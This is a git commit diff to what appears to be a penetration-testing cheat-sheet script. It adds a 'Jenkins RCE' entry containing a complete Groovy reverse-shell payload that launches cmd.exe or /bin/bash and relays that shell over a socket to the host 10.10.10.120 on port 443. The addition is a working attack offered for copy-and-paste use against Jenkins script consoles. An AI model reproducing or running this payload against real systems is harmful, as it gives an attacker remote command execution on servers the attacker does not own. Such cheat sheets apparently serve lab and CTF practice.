c47beea135abb49cab44126658bc7f18623ad00c
JavaliMZ <syjulio123@gmail.com>
2021-12-18 22:49:31 +0000

    New Cheat - Jenkins RCE

--- CheatList.py
+++ CheatList.py
@@ -2119,3 +2119,20 @@ WordpressTrics.output = """[*] Wordpress - Importante Files
 # VirtualHost
 /etc/apache2/sites-available/000-default.conf
 """
+
+######################################
+######################################
+
+jenkinsRCE = Cheat("JenkinsRCE with Script Groovy")
+jenkinsRCE.category = "Web"
+jenkinsRCE.subCategory = "RCE"
+jenkinsRCE.output = """[*] Execute command remotely with Script Groovy via Jenkins
+
+
+# or String cmd="/bin/bash";
+
+String host="10.10.10.120";
+int port=443;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+"""
